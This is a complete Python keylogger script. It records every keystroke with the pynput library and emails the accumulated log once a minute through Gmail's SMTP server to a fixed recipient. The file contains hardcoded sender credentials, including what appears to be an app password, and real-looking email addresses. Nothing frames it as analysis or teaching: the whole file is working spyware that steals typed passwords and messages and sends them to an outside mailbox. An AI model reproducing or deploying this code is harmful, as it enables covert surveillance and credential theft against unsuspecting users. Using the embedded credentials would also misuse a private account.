import threading
import time
import smtplib
from email.mime.text import MIMEText
from pynput import keyboard

# Configuration
EMAIL_ADDRESS = 'pcgpt00@gmail.com'
EMAIL_PASSWORD = 'qppb vztu zbed vfoo'
RECIPIENT_EMAIL = 'shlokshah412@gmail.com'
INTERVAL = 60  # Time interval in seconds

# Global variables
keystrokes = []

def send_email(subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())

def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(f'* pressed_{key} *')

def send_keystrokes():
    while True:
        time.sleep(INTERVAL)
        if keystrokes:
            subject = 'Keystrokes Log'
            body = ''.join(keystrokes)
            send_email(subject, body)
            keystrokes.clear()

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    send_thread = threading.Thread(target=send_keystrokes)
    send_thread.start()

if __name__ == "__main__":
    start_keylogger()